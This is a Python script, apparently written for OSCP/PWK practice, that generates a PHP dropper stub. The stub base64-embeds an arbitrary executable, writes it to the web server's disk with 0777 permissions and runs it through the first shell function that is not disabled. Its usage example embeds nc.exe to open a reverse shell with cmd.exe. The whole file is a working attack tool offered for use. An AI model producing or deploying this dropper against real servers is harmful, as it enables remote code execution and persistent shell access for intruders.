#
#		Description : 	Super Tiny PHP Dropper Stub.
#					  
#						This Project was coded to simplify my life during my PWK/OSCP journey.
#
#						I hope you will find it useful.
#
#                       Example : 
# 
# 						dcsc_phpdropper_gen.py -f nc.exe -o reverse_shell.php -c "127.0.0.1 1403 -e cmd.exe"
# 
#					~@DarkCoderSc 
#						--> https://www.twitter.com/DarkCoderSc 	
#

import argparse
import base64
import os

template = '''
<?php
	$payload_name = "<%payload_name%>"; 
	$payload_ext  = "<%payload_ext%>";  
	$payload_args = "<%payload_args%>"; 
	$payload      = "<%payload%>";      

	$shell_functions = array(
		"shell_exec",
		"exec",
		"system",
		"passthru"
	);

	$disabled_functions = array_map('strtolower', explode(",", ini_get("disable_functions")));

	$chosen_one = "";
	foreach ($shell_functions as $shell_function) {
		if (in_array($shell_function, $disabled_functions)) {
			continue;
		} 

		$chosen_one = $shell_function;

		break;
	} 

	if (empty($chosen_one)){
		echo "We can't execute commands :'(";

		exit();
	}

	$current_directory = getcwd() . DIRECTORY_SEPARATOR;

	$payload_bin = base64_decode($payload);

	$payload_destination = $current_directory . uniqid() . $payload_ext;

	$file = fopen($payload_destination, "w+");
	
	if ($file) {
		fwrite($file, $payload_bin);	
	} else {
		echo "Could not write payload to disk";

		fclose($file);	

		exit();
	} 

	fclose($file);	
		
	chmod($payload_destination, 0777);

	eval("\$chosen_one(\\"\$payload_destination \$payload_args\\");");
?>
'''

parser = argparse.ArgumentParser(description='Example : dcsc_phpdropper_gen.py -f nc.exe -o reverse_shell.php -c "127.0.0.1 1403 -e cmd.exe"')

parser.add_argument('-f', action="store", dest="payload", metavar='in-file',  type=argparse.FileType('rb'), required=True, help="Payload file to be embedded inside our PHP dropper stub.")
parser.add_argument('-o', action="store",  dest="output_file",  metavar='out-file', type=argparse.FileType('wt'), required=True, help="Output generated PHP dropper stub file.")
parser.add_argument('-c', action="store", dest="command_line", required=False, help="(Optional) Command line associated to your payload")
parser.add_argument('-n', action="store", dest="payload_filename", required=False, help="(Optional) Payload file name after being extracted without extension, by default it will automatically generate a unique file name.")

try:
    argv = parser.parse_args()
except IOError:
    parser.error()

# Encode payload in base64
with open(argv.payload.name, argv.payload.mode) as file:
        encoded_payload = base64.b64encode(file.read()).decode('ascii')

# Extract payload file ext
ext = os.path.splitext(argv.payload.name)[1]

payload_filename = ""
if argv.payload_filename :
	payload_filename = argv.payload_filename

# Modify Template
template = template.replace("<%payload_name%>", payload_filename).replace("<%payload_ext%>", ext).replace("<%payload_args%>", argv.command_line).replace("<%payload%>", encoded_payload)

# Write PHP dropper stub to disk
with open(argv.output_file.name, "a") as file:
    file.write(template)
